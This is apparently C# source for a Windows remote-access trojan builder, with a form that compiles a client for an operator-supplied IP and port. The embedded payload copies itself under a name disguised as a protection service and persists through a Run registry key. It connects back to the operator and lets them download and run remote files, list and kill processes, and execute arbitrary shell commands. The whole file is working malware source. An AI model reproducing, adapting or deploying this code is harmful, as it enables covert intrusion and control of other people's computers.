using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using Microsoft.CSharp;

namespace V4mp1r3
{
    public partial class frmServerMaker : Form
    {
        public frmServerMaker()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(textBox1.Text == "")
            {
                MessageBox.Show("请输入IP/域名！", "提示");
            }
            else if(textBox2.Text =="")
            {
                MessageBox.Show("请输入端口号！", "提示");
            }
            else
            {
                string path = null;
                SaveFileDialog sf = new SaveFileDialog();
                sf.Filter = "可执行文件|*.exe";
                if (sf.ShowDialog() == DialogResult.OK)
                {
                    path = sf.FileName;
                    CSharpCodeProvider provider = new CSharpCodeProvider();
                    CompilerParameters parameters = new CompilerParameters();
                    parameters.GenerateExecutable = true;
                    parameters.GenerateInMemory = false;
                    parameters.OutputAssembly = path;
                    parameters.CompilerOptions = "/t:winexe";
                    parameters.ReferencedAssemblies.Add("System.dll");
                    parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                    parameters.ReferencedAssemblies.Add("Microsoft.CSharp.dll");
                    parameters.ReferencedAssemblies.Add("System.Core.dll");
                    parameters.ReferencedAssemblies.Add("System.Data.dll");
                    parameters.ReferencedAssemblies.Add("System.Data.DataSetExtensions.dll");
                    parameters.ReferencedAssemblies.Add("System.Deployment.dll");
                    parameters.ReferencedAssemblies.Add("System.Drawing.dll");
                    parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
                    parameters.ReferencedAssemblies.Add("System.Xml.dll");
                    parameters.ReferencedAssemblies.Add("System.Xml.Linq.dll");
                    string source = @"
            using System;
            using System.Collections.Generic;
            using System.ComponentModel;
            using System.Data;
            using System.Drawing;
            using System.Linq;
            using System.Text;
            using System.Threading.Tasks;
            using System.Windows.Forms;
            using System.Net.Sockets;
            using System.IO;
            using System.Diagnostics;
            using System.Threading;
            using Microsoft.Win32;
            using System.Reflection;
            using System.Net;
            namespace Server
            {
                static class Program
                {
                    public static BinaryReader br;
                    public static BinaryWriter bw;
                    static void Main(string[] args)
                    {
                        a:
                        TcpClient client = new TcpClient();
                        try
                        {
                            if (!File.Exists(@""C:\Windows\WindowsProtectServer.exe""))
                            {
                                File.Copy(Assembly.GetEntryAssembly().Location, @""C:\Windows\WindowsProtectServer.exe"");
                                RegistryKey RKey = Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"");
                                RKey.SetValue(""WindowsProtectServer"", @""C:\Windows\WindowsProtectServer.exe"");
                            }
                        }
                        catch
                        {

                        }
                        while (true)
                        {
                            try
                            {
                                client.Connect(""127.0.0.1"", 2021);
                                break;
                            }
                            catch
                            {

                            }
                        }
                        while(true)
                        {
                            try
                            {
                                NetworkStream clientStream = client.GetStream();
                                br = new BinaryReader(clientStream);
                                string receive = null;
                                receive = br.ReadString();
                                if (receive == """")
                                {
                                }
                                else if(receive == ""Del"")
                                {
                                    try
                                    {
                                        RegistryKey RKey = Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"");
                                        RKey.DeleteValue(""WindowsProtectServer"");
                                        File.Delete(@""C:\Windows\WindowsProtectServer.exe"");
                                        Environment.Exit(0);
                                    }
                                    catch
                                    {
                                        Environment.Exit(0);
                                    }
                                }
                                else if(receive.Substring(0,3) == ""dar"")
                                {
                                    string[] receiveplus = receive.Split(',');
                                    WebClient webclient = new WebClient();
                                    try
                                    {
                                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                                        webclient.DownloadFile(receiveplus[2].ToString(), receiveplus[3].ToString());
                                        if(receiveplus[1] == ""1"")
                                        {
                                            Process.Start(receiveplus[3].ToString());
                                        }
                                        bw = new BinaryWriter(clientStream);
                                        bw.Write(""操作成功完成！""); 
                                    }
                                    catch(Exception e)
                                    {
                                        bw = new BinaryWriter(clientStream);
                                        bw.Write(e.Message); 
                                    }
                                }
                                else if (receive == ""prm"")
                                {
                                    try
                                    {
                                        Process[] processes = Process.GetProcesses(""."");
                                        string pname = null;
                                        string pid = null;
                                        string pplace = null;
                                        foreach (Process p in processes)
                                        {
                                            pname += p.ProcessName.ToString() + "","";
                                            pid += p.Id.ToString() + "","";
                                            pplace += p.PrivateMemorySize64.ToString() + "","";
                                        }
                                        bw = new BinaryWriter(clientStream);
                                        bw.Write(pname);
                                        Thread.Sleep(100);
                                        bw.Write(pid);
                                        Thread.Sleep(100);
                                        bw.Write(pplace);
                                    }
                                    catch
                                    {

                                    }
                                }
                                else if(receive.Substring(0, 3) == ""prk"")
                                {
                                    try
                                    {
                                        string[] receiveplus = receive.Split(',');
                                        Process p = Process.GetProcessById(Int32.Parse(receiveplus[1]));
                                        p.Kill();
                                    }
                                    catch
                                    {

                                    }
                                }
                                else if(receive == ""disconnect"")
                                {
                                    Environment.Exit(0);
                                }
                                else
                                {
                                    Process p = new Process();
                                    p.StartInfo.FileName = ""cmd.exe"";
                                    p.StartInfo.UseShellExecute = false;
                                    p.StartInfo.RedirectStandardInput = true;
                                    p.StartInfo.RedirectStandardOutput = true;
                                    p.StartInfo.RedirectStandardError = true;
                                    p.StartInfo.CreateNoWindow = true;
                                    p.Start();
                                    p.StandardInput.WriteLine(receive + ""&exit"");
                                    p.StandardInput.AutoFlush = true;
                                    string output = p.StandardOutput.ReadToEnd();
                                    p.Close();
                                    bw = new BinaryWriter(clientStream);
                                    bw.Write(output);
                                }
                            }
                            catch
                            {
                                client.Close();
                                break;
                            }
                        }
                        goto a;
                    }
                }
            }
        ";
                    string sourceplus = source.Replace("127.0.0.1", textBox1.Text);
                    string sourcemultiply = sourceplus.Replace("2021", textBox2.Text);
                    CompilerResults cr = provider.CompileAssemblyFromSource(parameters, sourcemultiply);
                    if (cr.Errors.Count > 0)
                    {
                        StringBuilder sb = new StringBuilder();
                        foreach (var er in cr.Errors)
                        {
                            sb.AppendLine(er.ToString());
                            MessageBox.Show(sb.ToString(), "提示");
                        }
                    }
                    else
                    {
                        MessageBox.Show("服务端生成成功！", "提示");
                    }
                }               
            }
        }
    }
}
